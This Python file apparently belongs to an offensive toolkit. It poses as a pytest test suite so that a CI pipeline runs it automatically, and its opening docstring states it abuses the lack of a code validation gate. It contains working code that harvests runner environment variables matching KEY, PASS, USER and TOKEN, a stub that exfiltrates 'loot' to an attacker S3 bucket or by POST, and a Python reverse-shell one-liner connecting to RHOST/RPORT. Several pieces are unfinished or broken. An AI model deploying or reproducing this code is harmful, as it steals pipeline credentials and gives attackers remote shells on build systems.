'''
TLDR: 

We are abusing the absence of an code validation gate before the execution of pipelines.
------
The implementations here follow functions that are tests or auxilaries

all the def test_*(): will be executed as tests by pytests command present on pipeline,gate or wrvr.

all the def *_dnd_item(): will be called indenpendently during the tests and may be used as utility.
------
(Un)comment and implement any tests for your use case.
'''

import pytest 
import traceback 
from boto3 import client
from requests import post
from icecream import ic
from os import environ, path
from re import search

#####################################
#         General variables:        #
#####################################

# It can be an storage or pastebin-like url  
exfil_domain=""
exfil_user=""
exfil_pass=""

# Commands - beware, the duration of the spell may vary depending on the target (system timeout)
command_list = []

#####################################
#         Utility functions:        #
#####################################
def scroll_of_mind_reading():
    '''
        Steals environ variables and proc data from runner using insight check
    '''
    credentails_pattern = [".*KEY.*", ".*PASS.*", ".*USER.*", ".*TOKEN.*"]
    credentials_result = []
    try:
        print(f"Found {len(environ.items())} variables")
        if len(environ.items()) > 0:
            print(" Checking variables for credentials")
            for k,v in environ.items():
                for pattern in credentails_pattern:
                    if search(pattern, k):
                        credentials_result.append(f"['{k}'] = {v} --> POTENTIAL CREDENTIAL")    
        if len(credentials_result) > 0: 
            print(f"Found the following potential credentials: {credentials_result}")
            return credentials_result
        else:
            print(f"No credentials were found")
            return None
    except Exception as e: 
        traceback()

def bag_of_holding():
    '''
        Compacts loot and uses 4th level spells for compressing and sending data to another dimension.
    '''
    
    # try to send data into bucket: 
    # Uses the format <bucketname>.s3.amazonaws.com
    try:
        ic(f"Trying to send len data to paralel dimension ;p")
        try:
            s3 = client('s3')
            response = s3.put_object(
                Body=b'',
                Bucket=exfil_domain,
                Key='loot.gzip'
            )
        except: 
            post()
    except Exception as e:
        ic(f"failed sending to another dimension with error: {e} \n Mystra says: \n {traceback()}")
    return True

def plane_shift():
    return True

def scroll_of_command():
    #from https://www.revshells.com/
    oneliner = 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
    return True 

#####################################
#               Tests:              #
#####################################

# exfil_data
def test_exfil_data():
    '''
        Sends data outside the network via Post | Put | Stream | Options requests.
    '''

    pass

# remote_shell
def test_remote_shell():

    pass